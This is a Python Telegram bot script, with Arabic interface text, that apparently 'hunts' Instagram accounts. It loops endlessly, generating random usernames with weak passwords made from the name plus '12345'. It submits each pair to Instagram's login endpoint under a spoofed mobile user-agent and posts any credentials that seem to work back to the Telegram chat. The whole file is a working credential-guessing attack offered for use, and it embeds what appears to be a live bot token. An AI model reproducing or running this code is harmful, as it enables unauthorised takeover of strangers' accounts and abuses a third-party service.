import requests
from telebot import types
import telebot
from time import sleep
import random
from uuid import uuid4
import time
import datetime
from threading import Thread, Event
import webbrowser



bot = telebot.TeleBot('6305632557:AAHSrOX024gCojJ784Ot7dFny6fNcac5jvg')
r = requests.session()

@bot.message_handler(commands=["start"])
def start(message):
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 2
    ii = types.InlineKeyboardButton(text=' اضغط هنا للصيد', callback_data='sajad')
    maac.add(ii)
    bjj = message.chat.id
    bot.send_message(message.chat.id, text='\n【 اهـلا بـك فـي بـوت صـيـد انـسـتا 🔥 】\n\n【 اضـغـط /start لبدء الصـيـد ☠ 】\n\n【 الــمــطــوࢪ ☜ : @M02MM 】\n    ', parse_mode='html', reply_to_message_id=message.message_id, reply_markup=maac)

@bot.callback_query_handler(func=lambda call: True)
def oss(call):
    if call.data == 'sajad':
        sajad(call.message)

def sajad(message):
    no = 0
    ok = 0
    N = 'qwertyuiopasdfghjklzxcvbnmpoiuytrewq'
    sajad = '12345'
    while True:
        R = str(''.join(random.choice(N) for t in range(5)))
        user = R
        pess = R + sajad
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
        uid = str(uuid4())
        tim = str(time.time()).split('.')[1]
        data = {'uuid': uid, 'password': pess, 'username': user, 'device_id': uid, 'from_reg': 'false', '_csrftoken': 'missing', 'login_attempt_countn': '0'}
        respone = requests.post(url, headers=headers, data=data).text
        if 'csrf' in respone:
            ok += 1
            mees = types.InlineKeyboardMarkup(row_width=1)
            sa1 = types.InlineKeyboardButton(f'''DONE : {ok}''', callback_data='sa2')
            sa2 = types.InlineKeyboardButton(f'''ERROR : {no}''', callback_data='sa')
            sa3 = types.InlineKeyboardButton(f'''{user}:{pess}''', callback_data='sa3')
            sa4 = types.InlineKeyboardButton('قناة المطور', url='https://t.me/uiujq ', callback_data='sa4')
            mees.add(sa1, sa2, sa3, sa4)
            bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text='  【  تـم بـدء الـصـيـد انـتـضـر لـكِ يـصـلك الـصـيد 】 ', parse_mode='markdown', reply_markup=mees)
            bot.send_message(message.chat.id, f'''New Account\n username  : {user}\nPassword : {pess} ''', parse_mode='html')
        else:
            no += 1
            mees = types.InlineKeyboardMarkup(row_width=1)
            sa1 = types.InlineKeyboardButton(f'''DONE : {ok}''', callback_data='sa2')
            sa2 = types.InlineKeyboardButton(f'''ERROR : {no}''', callback_data='sa')
            sa3 = types.InlineKeyboardButton(f'''{user} : {pess}''', callback_data='sa3')
            sa4 = types.InlineKeyboardButton('الــمـطــوࢪ ', url='https://t.me/M02MM ', callback_data='sa4')
            mees.add(sa1, sa2, sa3, sa4)
            bot.edit_message_text(chat_id=message.chat.id, message_id=message.message_id, text='  【  تـم بـدء الـصـيـد انـتـضـر لـكِ يـصـلك الـصـيد 】 ', parse_mode='markdown', reply_markup=mees)
    
bot.polling(True)
